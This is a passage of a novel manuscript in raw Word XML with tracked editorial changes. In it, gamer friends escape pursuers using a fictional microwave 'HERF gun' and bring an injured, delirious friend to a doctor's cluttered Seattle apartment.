          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> that thing?” yelled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 HERF gun,” Danny answered.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Nerf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“High-Energy Radio Frequency,” said Danny. “</w:t>
      </w:r>
      <w:ins w:id="1556" w:author="TextVet" w:date="2016-03-18T16:10:00Z">
        <w:r w:rsidR="00832C93">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>A</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1557" w:author="TextVet" w:date="2016-03-18T16:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00832C93">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>S</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1558" w:author="TextVet" w:date="2016-03-18T16:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00832C93">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>pecifically, a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> directional High Power Microwave emitter, but </w:t>
      </w:r>
      <w:ins w:id="1559" w:author="TextVet" w:date="2016-03-18T16:10:00Z">
        <w:r w:rsidR="00832C93">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">known as </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>HERF more generally. It produces 3-megawatt bursts of S-band radiation in 50-nanosecond…”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Jason barked, “Dude! Some other time!”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“Right. Sorry. Now let me think. One over ten to the two point four times four pi r squared…” Danny mumbled. His mouth kept moving even after words stopped coming out. Finally he said, “…About six poiiiint… Six point three meters.”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do you need me to do, Danny?” Jason shouted back.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“Let them get within about 20 feet without exposing me to their passenger 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got it. Hold on tight!”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spun the wheel to the left, veering the car across the street’s divider into the oncoming traffic lane. He snapped the wheel straight again and slammed the brakes.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bracing himself against a seat, aimed his energy gun’s nozzle out through the broken rear window.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Jason braked, the Roadster pulled up to within a few scant feet. Danny could see the face of the driver, the Russian whom Mike had nearly killed, illuminated by the SUV’s taillights.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pulled the trigger.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Roadster’s headlights went dead. So did the motor.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yelled over his shoulder, “Floor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suddenly unpowered Roadster, rolling along by sheer momentum, quickly receded into the distance as the SUV sped away. Screaming Russian curse words followed them briefly before fading into the night.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Once the Roadster disappeared in the rearview mirror, Jason finally released the gas pedal, dropping the SUV down to street-legal speeds. They drove calmly, heading toward downtown Bellevue.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Mike drawled. “Can we tally up our experience points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said, “This man needs to get to a hospital. Go to Overlake. It’s close.”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hospitals,”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said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“Hospitals will ask questions,” Jason said.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00566952" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1560" w:author="TextVet" w:date="2016-03-18T16:14:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>“Are you people serious?</w:t>
      </w:r>
      <w:ins w:id="1561" w:author="TextVet" w:date="2016-03-18T16:14:00Z">
        <w:r w:rsidR="00CC4CDB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>!</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1562" w:author="TextVet" w:date="2016-03-18T16:14:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> screamed Tina. “He could slip into a </w:t>
      </w:r>
      <w:r w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1563" w:author="TextVet" w:date="2016-03-18T16:14:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>coma</w:t>
      </w:r>
      <w:r w:rsidR="000D3488"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asked warily, “Moshen…? How many hit points am I down to…?”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 think you’re in the negatives, man,” Moshen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looked horrified. “I need Cure Light Wounds! Does anybody here know Cure</w:t>
      </w:r>
      <w:ins w:id="1564" w:author="TextVet" w:date="2016-03-18T16:15:00Z">
        <w:r w:rsidR="007B2CF9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1565" w:author="TextVet" w:date="2016-03-18T16:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007B2CF9">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Light</w:t>
      </w:r>
      <w:ins w:id="1566" w:author="TextVet" w:date="2016-03-18T16:15:00Z">
        <w:r w:rsidR="007B2CF9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>…</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1567" w:author="TextVet" w:date="2016-03-18T16:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007B2CF9">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Wounds?”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asked, “Christina… It’s Christina,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she corrected.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 you know anywhere we can take him without leaving any records?”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said, “Of course she does. She’s a priestess. She knows Cure Light Wounds. None of you guys do. You’re all wizards. Wizards throw lightning bolts and</w:t>
      </w:r>
      <w:ins w:id="1568" w:author="TextVet" w:date="2016-03-18T16:15:00Z">
        <w:r w:rsidR="00C05DE0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, and</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> fireballs. Priests handle life energies and heal people.”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senseless words gave Tina an idea. “I </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>do</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> know a priestess, actually.”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doesn’t really mean…”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“Head towards Swedish Medical Center, on First Hill,” Tina ordered.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said no hospitals!”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“Stop spazzing,” Tina said. “I have a friend that lives there. She’ll know what to do.”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Navigator drove in silence. Across the long straight bridge of State Route 520, over the moonlit waters of Lake Washington, the speckled lights and skyscraper silhouettes of Seattle’s nighttime skyline loomed before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“Guys, listen,” Tina said. “I just want to say, whatever this is all about… Thank you for getting me out of there. Really.”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“Hey, anytime! No problem!” said Danny, adjusting his shoulder. “I mean, my pleasure! Well, not really, but… uh…” He smiled shyly. “I like your hair.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00B45500">
      <w:pPr>
        <w:pStyle w:val="ActBreak"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>Act II</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>13</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locals called it “Pill Hill”.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> Home to four sprawling hospitals and the state blood</w:t>
      </w:r>
      <w:ins w:id="1569" w:author="TextVet" w:date="2016-03-18T16:18:00Z">
        <w:r w:rsidR="001D715D">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bank, First Hill squeezed an entire city’s worth of medical care into one square mile of steeply sloped one-way streets. Beneath jumbled overpasses</w:t>
      </w:r>
      <w:del w:id="1570" w:author="TextVet" w:date="2016-03-18T16:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B57F42">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, there</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> sat crumbling condominiums and tiny turn-of-the-century houses, with bars on the windows and multiple deadbolts on the front doors. Within many resided the kinds of people who took comfort in living near a state-subsidized methadone dispensary or STD clinic.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bullet-riddled Lincoln Navigator parked in an unenforced tow-away zone did not look out of place.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“Has the bleeding stopped?” Natalie Rosenbaum asked upon opening her door. She was slightly taller than Tina, but considerably more girthy. She wore a purple UW School of Medicine sweatshirt, drawstring pants, and the demeanor of a battlefield commander.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“Mostly,” said Tina. “We couldn’t keep his nose pinched because of the swelling.” Mike’s nose looked like a red bulbous prosthetic glued onto his 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Natalie’s apartment was an unholy catastrophe. It was strewn with medical books and pizza cartons and candles, and smelled of cat litter and dirty socks. Notebooks and crusty paper plates littered her coffee table next to her MacBook Pro. Above her TV, on an unpainted wooden shelf nailed into the wall, sat an authentic human skull, between psychiatry textbooks on one side and racks of herbs and jewelry on the other. A small </w:t>
      </w:r>
      <w:del w:id="1571" w:author="TextVet" w:date="2016-03-18T16:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00711C8D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">dead snake was </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>stuffed</w:t>
      </w:r>
      <w:ins w:id="1572" w:author="TextVet" w:date="2016-03-18T16:22:00Z">
        <w:r w:rsidR="00711C8D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1573" w:author="TextVet" w:date="2016-03-18T16:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00711C8D">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and</w:t>
      </w:r>
      <w:ins w:id="1574" w:author="TextVet" w:date="2016-03-18T16:22:00Z">
        <w:r w:rsidR="00711C8D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1575" w:author="TextVet" w:date="2016-03-18T16:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00711C8D">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mounted</w:t>
      </w:r>
      <w:ins w:id="1576" w:author="TextVet" w:date="2016-03-18T16:22:00Z">
        <w:r w:rsidR="00711C8D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> snake</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> crawl</w:t>
      </w:r>
      <w:ins w:id="1577" w:author="TextVet" w:date="2016-03-18T16:22:00Z">
        <w:r w:rsidR="00711C8D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1578" w:author="TextVet" w:date="2016-03-18T16:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00711C8D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ing</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> out of the skull’s eye socket, its forked tongue </w:t>
      </w:r>
      <w:ins w:id="1579" w:author="TextVet" w:date="2016-03-18T16:20:00Z">
        <w:r w:rsidR="00052BEB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>probing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1580" w:author="TextVet" w:date="2016-03-18T16:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00052BEB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sticking out</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="1581" w:author="TextVet" w:date="2016-03-18T16:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00052BEB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>inquisitively</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1582" w:author="TextVet" w:date="2016-03-18T16:21:00Z">
        <w:r w:rsidR="00052BEB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>beholders</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“Come here. Sit down,” Natalie ordered Mike.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an annoyed meow, a small furry gray blur scurried away as the crew of strangers entered the living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Natalie cleared </w:t>
      </w:r>
      <w:del w:id="1583" w:author="TextVet" w:date="2016-03-18T16:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0091563F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">off </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">some space on her couch, sweeping aside a Pepsi bottle, a stuffed doll, and a bundle of twine. </w:t>
      </w:r>
      <w:ins w:id="1584" w:author="TextVet" w:date="2016-03-18T16:24:00Z">
        <w:r w:rsidR="0008728C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">Dazed, </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Mike sat down</w:t>
      </w:r>
      <w:del w:id="1585" w:author="TextVet" w:date="2016-03-18T16:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0008728C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> in a daze</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, the couch shifting under his weight. Natalie took a look at the back of his head.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Back by the doorway, Moshen started sniffling and sneezing furiously. “Oh God damn it, you have a cat, don’t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“There’s Benadryl in the bathroom,” Natalie </w:t>
      </w:r>
      <w:ins w:id="1586" w:author="TextVet" w:date="2016-03-18T16:24:00Z">
        <w:r w:rsidR="00841D54">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ordered</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1587" w:author="TextVet" w:date="2016-03-18T16:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00841D54">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> over her shoulder.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eyed the piles of laundry and beaded jewelry he’d have to cross to reach the bathroom. He didn’t dare peek inside the bathroom itself.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suggested, “Why don’t you head back down to the car, Moshen? All your laptops and things are still in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my HERF gun,”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and his Nerf gun,” repeated Jason. “Go make sure someone doesn’t just reach through the busted windows and take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way, man!” said Moshen. “This hood’s all gangbangers and drug dealers. I ain’t sitting out there by myself!”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thought you said you know kung fu,” Jason teased, tossing him the keys to the SUV. Moshen hurried out the door, his sneezes receding down the hallway outside.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gave Mike some Tylenol and a glass of water. “Here, swallow these if you can.” She lifted the glass up to his mouth. Mike managed to comply.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sat next to him and examined his eyes, then dropped her hand down to his wrist and felt his pulse. “Has he been having seizures?” she asked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Tina replied. “But he threw up once.”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Holding his fingers, Natalie asked, “Have his hands and lips been shaking like this the whole time?”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I don’t know. I didn’t notice,” replied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doctor looked into Mike’s eyes, puffy above his swollen furry cheeks, and asked, “Do you feel cold?”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answered Mike in a stuffy nasal drawl. “I feel warm. And my face hurts.”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“Tina,” said Natalie. “You said on the phone that he was in some kind of fight, right? How bad was it? Emotionally, I mean. Is this just someone shoving him in line at a bar somewhere and it got out of hand, or was he fighting for his life?”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said quietly, “It was… bad.”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said to the large man, “What’s your name? Do you know where you are?”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replied, “My name is Krongor. I’m a Level 5 Barbarian Warrior. We’re in the Blade Coast city of Salavina, near the Temple of Eir.”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Natalie’s jaw dropped. She turned to Tina with a bewildered expression. “Okay, I was not expecting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“He’s delirious,” Tina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shook her head ponderously and looked back at Mike. “We’re near the Temple of </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>what</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“Eir,” said Mike. “Handmaiden of Frigga.”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Natalie’s eyes lit up and a wide smile overtook her face. She threw her head back and let out a loud, raucous laugh.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asked with worry, “What’s going on? What’s so funny?”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kept laughing. “That’s brilliant!”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 he going to be okay?” asked Jason. “Is he brain-damaged?”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“Eir! The Norse goddess of healing!” she said with delight. “And we’re down the street from Swedish Medical Center!”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smiled.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squeezed his arm and said, “Listen. My name is Doctor Natalie Rosenbaum. This is my apartment. You’re safe here. I know you’re hurt, you’re scared, but you’re going to be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nodded slowly.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want you to close your eyes,” she said methodically, “and inhale slowly through your mouth. Hold your breath in… Good… And then slowly let it out. Focus on relaxing. Breathe in… This is a safe place. Nothing bad will happen to you here. And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After a few repetitions, Mike opened his eyes. They were wet.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“What’s your name?” asked Natalie.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“Mike,” he answered. “Michael Braun.”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you tell me where you are, Mike?” she asked softly.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We’re on Pill Hill by Swedish Medical,” he said quietly. “In your apartment.”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“Very good, Mike,”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 mess,” he added.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smiled bashfully.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looked blankly over Natalie’s shoulder and said, “I haven’t forgotten.”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“Forgotten what, Mike?” she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I’m going to die.”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“You’re not going to die, Mike,” Natalie said reassuringly.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I am,” he said. “We all do. ‘Remember to keep death daily before one’s eyes. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Memento mori.</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Natalie turned her head and followed Mike’s gaze. He was </w:t>
      </w:r>
      <w:ins w:id="1588" w:author="TextVet" w:date="2016-03-19T13:46:00Z">
        <w:r w:rsidR="00084149">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>scanning</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1589" w:author="TextVet" w:date="2016-03-19T13:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00084149">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>l</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1590" w:author="TextVet" w:date="2016-03-19T13:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00084149">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ooking at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
